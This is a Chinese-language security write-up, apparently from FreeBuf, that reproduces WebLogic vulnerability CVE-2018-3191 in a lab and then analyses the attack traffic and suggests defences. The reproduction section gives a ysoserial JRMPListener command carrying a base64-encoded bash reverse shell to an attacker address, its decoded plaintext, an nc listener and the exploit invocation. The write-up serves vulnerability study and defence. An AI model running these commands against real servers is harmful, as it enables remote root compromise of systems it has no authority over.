***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 一、前言

 **在不久前Oracle官方发布的10月重要补丁更新公告(Oracle Critical Patch Update Advisory - October
2018)中发布了五个基于T3协议的WebLogic远程高危漏洞（CVE-2018-3191、CVE-2018-3197、CVE-2018-3201、CVE-2018-3245、CVE-2018-3252），CVSS
3.0 Base Score均为9.8分，版本涉及：10.3.6.0, 12.1.3.0,
12.2.1.3,本文将针对其中影响较大的CVE-2018-3191进行复现与分析,并在流量端进行追溯。**![Oracle官方发布的10月重要补丁更新公告](https://image.3001.net/images/20181026/1540517949_5bd2703dc39a2.png!small)

## 二、概要

Weblogic是目前全球市场上应用最广泛的J2EE工具之一，被称为业界最佳的应用程序服务器，其用于构建J2EE应用程序，支持新功能，可降低运营成本，提高性能，增强可扩展性并支持Oracle
Applications产品组合。

官方文档传送门：<https://docs.oracle.com/middleware/12213/wls/INTRO/intro.htm#INTRO123>。

 **** **关于T3协议：**

说到T3协议就不得不提起JAVA远程方法调用: **JAVA RMI(Java Remote Method Invocation)**
,其主要用于实现远程过程调用的Application编程接口。通过RMI可以使计算机上运行的程序调用远程服务器上的对象，其目的是使得远程接口对象的使用尽可能简化。该接口的实现方式之一即为：
**JRMP( **Java远程消息交换协议，** Java Remote Message Protocol）**，也可以使用 **CORBA**
兼容的方法实现。详细介绍请参考： <https://blog.csdn.net/cdl2008sky/article/details/6844719>。

T3协议是用于Weblogic服务器和其他Java
Application之间传输信息的协议，是实现上述RMI远程过程调用的专有协议，其允许客户端进行JNDI调用。  

当Weblogic发起一个T3协议连接的时候，Weblogic会连接每一个Java虚拟机并传输流量，由于通信过程得到了极大的简化，所以使得其在操作系统资源利用上实现的高效以及最大化，同时提高了传输速度。

## 三、分析与复现

###  **3.1 环境说明：**

 **攻击机：**

    
    
    192.168.137.135 （Linux  4.15.0-kali2-amd64 #1 SMP Debian 4.15.11-1kali1 x86_64 GNU/Linux）

 **靶机：**

    
    
    192.168.137.128 （Linux ubuntu 4.15.0-36-generic #39~16.04.1-Ubuntu SMP  x86_64 GNU/Linux）

###  **3.2 Weblogic服务信息的快速检测**

首先，需要探测靶机Weblogic服务的相关信息，通过使用 **Nmap** 工具进行快速扫描，命令如下：

    
    
    nmap -Pn -sV 192.168.137.128 -p7001 --script=weblogic-t3-infi.nse

如下图标记所示，靶机的Weblogic开启了T3协议，且属于受CVE-2018-3191影响的版本范围，因此，存在着漏洞风险。

![存在着漏洞风险](https://image.3001.net/images/20181026/1540518228_5bd27154459bc.png!small)

### 3.3 建立接收被攻击方Weblogic请求的JRMP Listener

在获取靶机的Weblogic版本及T3协议的相关信息后，即可开始进行漏洞复现。这里，我们需要使用到ysoserial工具，该工具可以针对不同的Weblogic产品给出漏洞利用脚本。

下载地址：<https://github.com/angelwhu/ysoserial>。

ysoserial工具基本使用方法：

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener  【port】 CommonsCollections1 '【commands】'

此处，我们在终端输入命令：

    
    
    java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 2345 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzUvNzg5MCAwPiYx|{base64,-d}|{bash,-i}'

目的是在本地建立一个JRMPListener **（批注：Java Remote Method Protocol， **
**Java远程消息交换协议。****
是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在RMI之下、TCP/IP之上的线路层协议）**，用于接收被攻击方的Weblogic请求，并执行指定的bash反弹命令。

命令后半段的bash命令进行了base64转码解码的操作，此举是为了避免Runtime.getRuntime().exec()
执行过程中将特殊符号转义，明文为： ****

    
    
     **bash -i >& /dev/tcp/192.168.138.135/7890 0>&1**

下图可以看到，我们成功打开了JRMP listener：

![成功打开了JRMP
listener](https://image.3001.net/images/20181026/1540518312_5bd271a86284f.png!small)

###  **3.4 监听7890端口**

    
    
    nc -lvvp 7890

此举是为了等待靶机反弹bash连接。

###  **3.5 执行Exploit**

    
    
    python exploit.py 192.168.137.128 7001 weblogic-spring-jndi.jar 192.168.137.135 2345

Weblogic发起远程方法调用，即 **rmi**
服务![发起远程方法调用](https://image.3001.net/images/20181026/1540518577_5bd272b10a8f8.png!small)

上图可以看到，生成了攻击载荷，且注入成功，此时nc监听的端口会收到反弹的bash，获得root权限。

 **工具下载地址：**

CVE-2018-3191 payload生成工具：

> [https://github.com/voidfyoo/CVE-2018-3191/releases](http://www.example.com)

Weblogic T3协议发送工具：  

> <https://github.com/Libraggbond/CVE-2018-3191>

**（注：工具安全性请自行查验）**

## 四、流量侧捕获与分析

如图所示为此次在攻击过程中在流量侧抓取的数据包，其中No.16为带有攻击载荷的流量包：![image.png](https://image.3001.net/images/20181026/1540518771_5bd273736d86f.png!small)经过对TCP流的追踪，我们可以在此基础上进行详细分析。

### 4.1 通过T3协议进行通信

![通过T3协议进行通信](https://image.3001.net/images/20181026/1540518813_5bd2739d85b45.png!small)

### 4.2 JtaTransactionManager类

由于此前Oracle官方没有将 **com.bea.core.repackaged** 包中的
**AbstractPlatformTransactionManager** 类加入到黑名单中，因此导致了Spring
JNDI注入的发生。通过我们对CVE-2018-3191 POC的分析，在此类中，其主要是使用了 **JtaTransactionManager**
这个类进行Spring
JNDI注入，这点我们也可以在流量端有所发现：![JtaTransactionManager类](https://image.3001.net/images/20181026/1540518850_5bd273c21d02b.png!small)

### 4.3 攻击payload

###
**![攻击payload](https://image.3001.net/images/20181026/1540518865_5bd273d14493d.png!small)**

### 4.4 基于T3专有协议的Java.rmi远程方法调用

**![基于T3专有协议的Java.rmi远程方法调用](https://image.3001.net/images/20181026/1540518899_5bd273f338445.png!small)**综上，通过上述关键特征，我们可以很快提取出waf相关防御规则。  

## 五、防御建议  

根据本文上述分析，安全工作人员可很快提取相关防御规则升级至WAF系统，由于攻击者是通过T3协议来完成攻击，所以在T3协议访问控制上应该严加管控，ORACLE在本次10月重要披露中除CVE-2018-3252外均可通过
**T3协议访问控制策略** 来进行临时防御。通过Weblogic中 **base_domain的设置页面的"安全"->"筛选器"来进行配置和防御**，具体方法不再赘述，请参考网络资料。

由于本次公开的漏洞涉及到了几个较大的版本号，所以影响还是非常大的，建议受漏洞影响的用户尽快升级或更新补丁来进行防护。鉴于Weblogic在防御反序列化漏洞上通常采用黑名单的方式，黑名单在攻击防御侧存在严重弊端，所以在升级版本或更新补丁的同时
**建议将JDK版本升级至最新版本** 。

 **官方修复链接与说明：**<https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html>

 ***本文作者：安天 Web安全团队，转载请注明来自FreeBuf.COM**

